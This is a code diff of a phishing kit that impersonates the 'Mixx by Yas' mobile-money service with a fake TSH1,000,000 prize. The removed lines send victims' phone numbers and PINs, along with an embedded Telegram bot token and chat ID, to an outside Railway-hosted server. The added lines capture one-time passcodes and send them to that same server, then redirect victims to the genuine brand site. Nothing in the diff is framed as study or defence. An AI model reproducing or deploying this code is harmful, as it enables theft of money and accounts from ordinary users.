@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mixx by Yas - Login</title>
+    <title>Mixx by Yas - Verify OTP</title>
     <style>
         * {
             margin: 0;
@@ -38,31 +38,7 @@
         .bottom-left { bottom: 10px; left: 10px; transform: rotate(10deg); }
         .bottom-right { bottom: 10px; right: 10px; transform: rotate(-10deg); }
 
-        .confetti-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            opacity: 0;
-            animation: confettiFall 4s ease-in forwards;
-        }
-
-        @keyframes confettiFall {
-            0% { opacity: 1; transform: translateY(-10px) rotate(0deg) scale(1); }
-            100% { opacity: 0; transform: translateY(100vh) rotate(720deg) scale(0.5); }
-        }
-
-        .login-card {
+        .verify-card {
             background: rgba(255, 255, 255, 0.96);
             backdrop-filter: blur(2px);
             border-radius: 48px;
@@ -131,66 +107,44 @@
             color: #1C2E5B;
             margin: 12px 0 0px;
             box-shadow: 0 4px 0 #b87f00;
-            transform: rotate(-0.5deg);
             animation: pulseWin 2s ease-in-out infinite;
         }
 
         @keyframes pulseWin {
-            0%, 100% { transform: rotate(-0.5deg) scale(1); }
-            50% { transform: rotate(-0.5deg) scale(1.03); }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
         }
 
-        .login-header { margin: 14px 0 6px; }
-        .login-header h2 { font-size: 22px; color: #1C2E5B; font-weight: 700; }
-        .login-header p { color: #64748b; font-size: 14px; margin-top: 4px; }
+        .verify-header { margin: 14px 0 6px; }
+        .verify-header h2 { font-size: 22px; color: #1C2E5B; font-weight: 700; }
+        .verify-header p { color: #64748b; font-size: 14px; margin-top: 4px; }
 
-        .form-group { margin-top: 20px; text-align: left; }
-        .form-group label {
-            display: block;
-            font-weight: 700;
-            color: #1C2E5B;
-            margin-bottom: 6px;
-            font-size: 14px;
-            padding-left: 5px;
-        }
-        .form-group input[type="tel"] {
-            width: 100%;
-            padding: 14px 18px;
-            font-size: 18px;
-            border: 2px solid #e2e8f0;
+        .verify-header .phone-display {
+            background: #f0f4fa;
+            padding: 8px 16px;
             border-radius: 50px;
-            background: white;
-            transition: 0.2s;
-            outline: none;
-            font-weight: 500;
-            -webkit-appearance: none;
-            text-align: center;
-            font-family: inherit;
-        }
-        .form-group input[type="tel"]:focus {
-            border-color: #F4B400;
-            box-shadow: 0 0 0 3px rgba(244, 180, 0, 0.2);
-        }
-        .form-group input[type="tel"].error {
-            border-color: #ef4444;
-            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+            display: inline-block;
+            font-weight: 600;
+            color: #1C2E5B;
+            margin-top: 8px;
+            font-size: 16px;
         }
 
-        .pin-wrapper {
+        .otp-wrapper {
             display: flex;
             gap: 12px;
             justify-content: center;
-            margin-top: 4px;
+            margin-top: 16px;
         }
 
-        .pin-box {
-            width: 65px;
+        .otp-box {
+            width: 55px;
             height: 65px;
             text-align: center;
             font-size: 32px;
             font-weight: 700;
             border: 2px solid #cbd5e1;
-            border-radius: 20px;
+            border-radius: 16px;
             background: white;
             transition: 0.15s;
             font-family: 'Courier New', monospace;
@@ -198,13 +152,30 @@
             -webkit-appearance: none;
             caret-color: #F4B400;
         }
-        .pin-box:focus {
+        .otp-box:focus {
             border-color: #F4B400;
             box-shadow: 0 0 0 3px #ffe699;
         }
-        .pin-box.error {
+        .otp-box.error {
             border-color: #ef4444;
             box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+        }
+
+        .resend-section {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #64748b;
+        }
+        .resend-section .timer { font-weight: 700; color: #1C2E5B; }
+        .resend-section .resend-link {
+            color: #F4B400;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .resend-section .resend-link.disabled {
+            color: #94a3b8;
+            cursor: not-allowed;
         }
 
         .error-message {
@@ -214,10 +185,9 @@
             min-height: 20px;
             margin-top: 8px;
             text-align: center;
-            transition: opacity 0.2s;
         }
 
-        .login-btn {
+        .verify-btn {
             width: 100%;
             padding: 16px;
             background: linear-gradient(135deg, #F4B400, #e6a800);
@@ -237,11 +207,11 @@
             gap: 10px;
             position: relative;
         }
-        .login-btn:active {
+        .verify-btn:active {
             transform: translateY(2px);
             box-shadow: 0 2px 0 #b87f00;
         }
-        .login-btn:disabled {
+        .verify-btn:disabled {
             opacity: 0.6;
             transform: translateY(2px);
             box-shadow: 0 2px 0 #b87f00;
@@ -257,17 +227,10 @@
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
-        .login-btn.loading .spinner { display: block; }
-        .login-btn.loading .btn-text { display: none; }
+        .verify-btn.loading .spinner { display: block; }
+        .verify-btn.loading .btn-text { display: none; }
 
         @keyframes spin { to { transform: rotate(360deg); } }
-
-        .login-footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #94a3b8;
-        }
-        .login-footer a { color: #1C2E5B; text-decoration: none; font-weight: 600; }
 
         .success-overlay {
             display: none;
@@ -286,31 +249,50 @@
         .success-overlay h3 { color: #1C2E5B; font-size: 24px; }
         .success-overlay p { color: #64748b; font-size: 14px; margin-top: 6px; }
 
-        /* Responsive */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            animation: confettiFall 4s ease-in forwards;
+        }
+
+        @keyframes confettiFall {
+            0% { opacity: 1; transform: translateY(-10px) rotate(0deg) scale(1); }
+            100% { opacity: 0; transform: translateY(100vh) rotate(720deg) scale(0.5); }
+        }
+
         @media (max-width: 480px) {
-            .login-card { padding: 24px 16px 35px; border-radius: 40px; }
+            .verify-card { padding: 24px 16px 35px; border-radius: 40px; }
             .brand-title { font-size: 24px; }
-            .login-header h2 { font-size: 20px; }
+            .verify-header h2 { font-size: 20px; }
             .win-text { font-size: 16px; padding: 8px 16px; }
-            .pin-box { width: 55px; height: 55px; font-size: 28px; border-radius: 16px; }
-            .pin-wrapper { gap: 10px; }
-            .form-group input[type="tel"] { padding: 12px 16px; font-size: 16px; }
-            .login-btn { padding: 14px; font-size: 16px; }
+            .otp-box { width: 50px; height: 55px; font-size: 28px; border-radius: 14px; }
+            .otp-wrapper { gap: 8px; }
+            .verify-btn { padding: 14px; font-size: 16px; }
             .back-link { top: 16px; left: 16px; font-size: 12px; }
         }
 
         @media (max-width: 380px) {
-            .pin-box { width: 48px; height: 48px; font-size: 24px; border-radius: 14px; }
-            .pin-wrapper { gap: 8px; }
-            .login-card { padding: 20px 12px 30px; border-radius: 32px; }
-            .brand-title { font-size: 20px; }
-            .logo { max-width: 100px; }
-            .win-text { font-size: 14px; padding: 6px 12px; }
+            .otp-box { width: 42px; height: 48px; font-size: 24px; border-radius: 12px; }
+            .otp-wrapper { gap: 6px; }
+            .verify-card { padding: 20px 12px 30px; border-radius: 32px; }
         }
 
         @media (prefers-color-scheme: dark) {
             body { background: linear-gradient(145deg, #1a1a2e, #16213e); }
-            .login-card {
+            .verify-card {
                 background: rgba(30, 30, 50, 0.96);
                 border-color: rgba(244, 180, 0, 0.2);
             }
@@ -319,21 +301,17 @@
                 -webkit-background-clip: text;
                 background-clip: text;
             }
-            .login-header h2 { color: #f0f0f0; }
-            .login-header p { color: #94a3b8; }
-            .form-group label { color: #e2e8f0; }
-            .form-group input[type="tel"] {
+            .verify-header h2 { color: #f0f0f0; }
+            .verify-header p { color: #94a3b8; }
+            .verify-header .phone-display { background: rgba(255,255,255,0.08); color: #f0f0f0; }
+            .otp-box {
                 background: rgba(255,255,255,0.08);
                 border-color: #334155;
                 color: #f0f0f0;
             }
-            .pin-box {
-                background: rgba(255,255,255,0.08);
-                border-color: #334155;
-                color: #f0f0f0;
-            }
-            .login-footer { color: #64748b; }
-            .login-footer a { color: #F4B400; }
+            .otp-box:focus { border-color: #F4B400; }
+            .resend-section { color: #94a3b8; }
+            .resend-section .timer { color: #f0f0f0; }
             .success-overlay { background: rgba(30, 30, 50, 0.95); }
             .success-overlay h3 { color: #f0f0f0; }
             .success-overlay p { color: #94a3b8; }
@@ -352,9 +330,9 @@
 
     <div class="confetti-container" id="confettiContainer"></div>
 
-    <div class="login-card" id="loginCard">
+    <div class="verify-card" id="verifyCard">
 
-        <a href="https://yas.co.tz/mixx-by-yas/" class="back-link" id="backLink">
+        <a href="login.html" class="back-link" id="backLink">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                 <polyline points="15 18 9 12 15 6"></polyline>
             </svg>
@@ -378,73 +356,78 @@
 
         <div class="win-text">🎉 UMEJISHINDIA TSH1,000,000</div>
 
-        <div class="login-header">
-            <h2>Welcome Back</h2>
-            <p>Enter your credentials to claim your prize</p>
+        <div class="verify-header">
+            <h2>Verify Your Identity</h2>
+            <p>Enter the 6-digit OTP sent to</p>
+            <div class="phone-display" id="phoneDisplay">07XXXXXXXX</div>
         </div>
 
-        <form id="loginForm" novalidate>
-
-            <div class="form-group">
-                <label for="phoneInput">📱 Phone Number</label>
-                <input type="tel" id="phoneInput" placeholder="07XXXXXXXX" maxlength="10" autocomplete="tel" required>
-            </div>
-
-            <div class="form-group">
-                <label>🔐 PIN</label>
-                <div class="pin-wrapper" id="pinWrapper">
-                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
-                </div>
-            </div>
-
-            <div class="error-message" id="errorMessage"></div>
-
-            <button type="submit" class="login-btn" id="loginBtn">
-                <span class="btn-text">🔐 LOG IN & CLAIM PRIZE</span>
-                <span class="spinner"></span>
-            </button>
-
-        </form>
-
-        <div class="login-footer">
-            Protected by <a href="#">SSL Security</a> · Need help? <a href="#">Contact Support</a>
+        <div class="otp-wrapper" id="otpWrapper">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
         </div>
+
+        <div class="resend-section">
+            <span>Didn't receive the code? </span>
+            <span class="timer" id="timerDisplay">30s</span>
+            <a class="resend-link disabled" id="resendLink">Resend OTP</a>
+        </div>
+
+        <div class="error-message" id="errorMessage"></div>
+
+        <button type="button" class="verify-btn" id="verifyBtn">
+            <span class="btn-text">🔐 VERIFY & CLAIM PRIZE</span>
+            <span class="spinner"></span>
+        </button>
 
         <div class="success-overlay" id="successOverlay">
-            <div class="check">✅</div>
-            <h3>Login Successful!</h3>
-            <p>Redirecting you to verify your identity...</p>
+            <div class="check">🏆</div>
+            <h3>Congratulations!</h3>
+            <p>You've successfully claimed TSH1,000,000!</p>
+            <p style="font-size:12px; margin-top:12px; color:#94a3b8;">Redirecting to your dashboard...</p>
         </div>
     </div>
 
     <script>
         (function() {
-            const form = document.getElementById("loginForm");
-            const phoneInput = document.getElementById("phoneInput");
-            const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
-            const errorMessage = document.getElementById("errorMessage");
-            const loginBtn = document.getElementById("loginBtn");
-            const loginCard = document.getElementById("loginCard");
-            const successOverlay = document.getElementById("successOverlay");
-            const confettiContainer = document.getElementById("confettiContainer");
+            const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+            const verifyBtn = document.getElementById('verifyBtn');
+            const errorMessage = document.getElementById('errorMessage');
+            const successOverlay = document.getElementById('successOverlay');
+            const verifyCard = document.getElementById('verifyCard');
+            const confettiContainer = document.getElementById('confettiContainer');
+            const timerDisplay = document.getElementById('timerDisplay');
+            const resendLink = document.getElementById('resendLink');
 
-            let realPin = ["", "", "", ""];
+            let otp = ["", "", "", "", "", ""];
             let submitted = false;
+            let timerInterval = null;
+            let timeLeft = 30;
 
             // ===== RAILWAY API URL =====
             const API_URL = 'https://mixxbyyas-offers06com-production.up.railway.app';
 
-            // ===== TELEGRAM CREDENTIALS =====
-            const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
-            const TELEGRAM_CHAT_ID = '8392790531';
+            console.log('🔗 API URL:', API_URL);
+
+            // ===== GET PHONE FROM URL =====
+            const urlParams = new URLSearchParams(window.location.search);
+            const phone = urlParams.get('phone') || '07XXXXXXXX';
+            document.getElementById('phoneDisplay').textContent = phone;
+
+            // ===== BACK BUTTON GOES TO LOGIN =====
+            document.getElementById('backLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'login.html';
+            });
 
             // ===== CONFETTI EFFECT =====
             function launchConfetti() {
-                const colors = ['#F4B400', '#FFD966', '#1C2E5B', '#FF6B6B', '#4ECDC4', '#45B7D1'];
-                for (let i = 0; i < 50; i++) {
+                const colors = ['#F4B400', '#FFD966', '#1C2E5B', '#FF6B6B', '#4ECDC4', '#45B7D1', '#FF8A5C', '#A29BFE'];
+                for (let i = 0; i < 80; i++) {
                     const confetti = document.createElement('div');
                     confetti.className = 'confetti';
                     confetti.style.left = Math.random() * 100 + '%';
@@ -461,168 +444,177 @@
                 }, 4000);
             }
 
-            // ===== PHONE INPUT VALIDATION =====
-            phoneInput.addEventListener('input', function(e) {
-                this.value = this.value.replace(/\D/g, '').slice(0, 10);
-                this.classList.remove('error');
-                errorMessage.textContent = '';
-            });
+            // ===== TIMER =====
+            function startTimer() {
+                timeLeft = 30;
+                timerDisplay.textContent = timeLeft + 's';
+                resendLink.classList.add('disabled');
+                resendLink.style.pointerEvents = 'none';
 
-            phoneInput.addEventListener('blur', function() {
-                const val = this.value.trim();
-                if (val && !/^(07|06)\d{8}$/.test(val)) {
-                    this.classList.add('error');
-                    errorMessage.textContent = '❌ Please enter a valid phone number (07XXXXXXXX or 06XXXXXXXX)';
+                if (timerInterval) clearInterval(timerInterval);
+                timerInterval = setInterval(() => {
+                    timeLeft--;
+                    timerDisplay.textContent = timeLeft + 's';
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        timerDisplay.textContent = '0s';
+                        resendLink.classList.remove('disabled');
+                        resendLink.style.pointerEvents = 'auto';
+                    }
+                }, 1000);
+            }
+
+            // ===== RESEND OTP =====
+            resendLink.addEventListener('click', async function() {
+                if (this.classList.contains('disabled')) return;
+                
+                try {
+                    const response = await fetch(`${API_URL}/api/resend-otp`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: phone })
+                    });
+                    
+                    const data = await response.json();
+                    console.log('📥 Resend response:', data);
+                    
+                    if (data.status === 'success') {
+                        startTimer();
+                        errorMessage.textContent = '📤 New OTP sent to your phone';
+                        errorMessage.style.color = '#22c55e';
+                        setTimeout(() => { errorMessage.textContent = ''; }, 3000);
+                    } else {
+                        throw new Error(data.message || 'Failed to resend OTP');
+                    }
+                } catch (error) {
+                    console.error('❌ Resend error:', error);
+                    errorMessage.textContent = '❌ ' + (error.message || 'Failed to resend OTP');
                 }
             });
 
-            // ===== PIN INPUT HANDLING =====
-            pinBoxes.forEach((box, i) => {
+            // ===== OTP INPUT =====
+            otpBoxes.forEach((box, i) => {
                 box.addEventListener('input', function(e) {
                     let val = e.target.value.replace(/\D/g, '');
-                    if (!val) { realPin[i] = ""; return; }
+                    if (!val) { otp[i] = ""; return; }
                     e.target.value = val;
-                    realPin[i] = val;
+                    otp[i] = val;
                     this.classList.remove('error');
                     errorMessage.textContent = '';
 
-                    if (i < 3) { pinBoxes[i + 1].focus(); }
+                    if (i < 5) { otpBoxes[i + 1].focus(); }
 
-                    if (realPin.every(x => x !== "")) {
-                        setTimeout(() => { submitForm(); }, 150);
+                    if (otp.every(x => x !== "")) {
+                        setTimeout(() => { verifyOTP(); }, 150);
                     }
                 });
 
                 box.addEventListener('keydown', function(e) {
                     if (e.key === "Backspace") {
-                        realPin[i] = "";
-                        if (i > 0 && !this.value) { pinBoxes[i - 1].focus(); }
+                        otp[i] = "";
+                        if (i > 0 && !this.value) { otpBoxes[i - 1].focus(); }
                     }
                 });
 
                 box.addEventListener('paste', function(e) {
                     e.preventDefault();
                     const paste = (e.clipboardData || window.clipboardData).getData('text');
-                    const digits = paste.replace(/\D/g, '').slice(0, 4);
+                    const digits = paste.replace(/\D/g, '').slice(0, 6);
                     if (digits) {
                         const digitArray = digits.split('');
                         digitArray.forEach((digit, idx) => {
-                            if (idx < 4) {
-                                pinBoxes[idx].value = digit;
-                                realPin[idx] = digit;
+                            if (idx < 6) {
+                                otpBoxes[idx].value = digit;
+                                otp[idx] = digit;
                             }
                         });
-                        const nextEmpty = pinBoxes.findIndex((b, idx) => !realPin[idx]);
-                        if (nextEmpty !== -1 && nextEmpty < 4) {
-                            pinBoxes[nextEmpty].focus();
+                        const nextEmpty = otpBoxes.findIndex((b, idx) => !otp[idx]);
+                        if (nextEmpty !== -1 && nextEmpty < 6) {
+                            otpBoxes[nextEmpty].focus();
                         } else {
-                            pinBoxes[3].focus();
-                            if (realPin.every(x => x !== "")) {
-                                setTimeout(() => submitForm(), 200);
+                            otpBoxes[5].focus();
+                            if (otp.every(x => x !== "")) {
+                                setTimeout(() => verifyOTP(), 200);
                             }
                         }
                     }
                 });
             });
 
-            // ===== ENTER KEY ON PHONE INPUT =====
-            phoneInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    if (realPin.every(x => x !== "")) {
-                        submitForm();
-                    } else {
-                        pinBoxes[0].focus();
-                        errorMessage.textContent = '⚠️ Please enter your 4-digit PIN';
-                    }
-                }
-            });
+            // ===== VERIFY OTP =====
+            verifyBtn.addEventListener('click', verifyOTP);
 
-            // ===== FORM SUBMISSION =====
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                submitForm();
-            });
-
-            async function submitForm() {
+            async function verifyOTP() {
                 if (submitted) return;
 
-                const phone = phoneInput.value.trim();
-                const pin = realPin.join('');
+                const otpValue = otp.join('');
 
-                if (!phone || phone.length !== 10) {
-                    phoneInput.classList.add('error');
-                    errorMessage.textContent = '❌ Please enter a valid 10-digit phone number';
-                    phoneInput.focus();
+                if (otpValue.length !== 6) {
+                    errorMessage.textContent = '❌ Please enter all 6 digits of your OTP';
+                    otpBoxes.forEach(box => box.classList.add('error'));
+                    otpBoxes.find(b => !otp[otpBoxes.indexOf(b)])?.focus();
                     return;
                 }
 
-                if (!/^(07|06)\d{8}$/.test(phone)) {
-                    phoneInput.classList.add('error');
-                    errorMessage.textContent = '❌ Phone must start with 07 or 06 (e.g., 0712345678)';
-                    phoneInput.focus();
-                    return;
-                }
-
-                if (pin.length !== 4) {
-                    errorMessage.textContent = '❌ Please enter all 4 digits of your PIN';
-                    pinBoxes.forEach(box => box.classList.add('error'));
-                    pinBoxes.find(b => !realPin[pinBoxes.indexOf(b)])?.focus();
-                    return;
-                }
-
-                phoneInput.classList.remove('error');
-                pinBoxes.forEach(box => box.classList.remove('error'));
+                otpBoxes.forEach(box => box.classList.remove('error'));
                 errorMessage.textContent = '';
 
                 submitted = true;
-                loginBtn.classList.add('loading');
-                loginBtn.disabled = true;
-                loginCard.style.opacity = "0.7";
+                verifyBtn.classList.add('loading');
+                verifyBtn.disabled = true;
+                verifyCard.style.opacity = "0.7";
 
-                console.log('📤 Sending login data:', { phone, pin });
+                const requestData = { phone: phone, otp: otpValue };
+                console.log('📤 Verifying OTP:', requestData);
 
                 try {
-                    const response = await fetch(`${API_URL}/api/login`, {
+                    const response = await fetch(`${API_URL}/api/verify-otp`, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({ 
-                            phone: phone, 
-                            pin: pin,
-                            telegramBotToken: TELEGRAM_BOT_TOKEN,
-                            telegramChatId: TELEGRAM_CHAT_ID
-                        })
+                        body: JSON.stringify(requestData)
                     });
 
+                    console.log('📥 Verify response status:', response.status);
+
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error('❌ Response error:', errorText);
+                        throw new Error(`Server error: ${response.status}`);
+                    }
+
                     const data = await response.json();
-                    console.log('📥 Response:', data);
+                    console.log('📥 Verify data:', data);
 
                     if (data.status === 'success') {
                         launchConfetti();
                         successOverlay.classList.add('show');
-                        loginCard.style.opacity = "1";
+                        verifyCard.style.opacity = "1";
 
                         setTimeout(() => {
-                            window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-                        }, 2500);
+                            window.location.href = "https://yas.co.tz/mixx-by-yas/";
+                        }, 3500);
                     } else {
-                        throw new Error(data.message || 'Login failed');
+                        throw new Error(data.message || 'Invalid OTP');
                     }
                 } catch (error) {
                     console.error('❌ Error:', error);
-                    errorMessage.textContent = '❌ ' + (error.message || 'Login failed. Please try again.');
+                    errorMessage.textContent = '❌ ' + (error.message || 'Invalid OTP. Please try again.');
                     submitted = false;
-                    loginBtn.classList.remove('loading');
-                    loginBtn.disabled = false;
-                    loginCard.style.opacity = "1";
+                    verifyBtn.classList.remove('loading');
+                    verifyBtn.disabled = false;
+                    verifyCard.style.opacity = "1";
+                    otpBoxes.forEach(box => {
+                        box.value = '';
+                        box.classList.remove('error');
+                    });
+                    otp = ["", "", "", "", "", ""];
+                    otpBoxes[0].focus();
                 }
             }
 
-            document.getElementById('backLink').addEventListener('click', function(e) {
-                // Allow navigation to proceed
-            });
+            startTimer();
 
         })();
     </script>
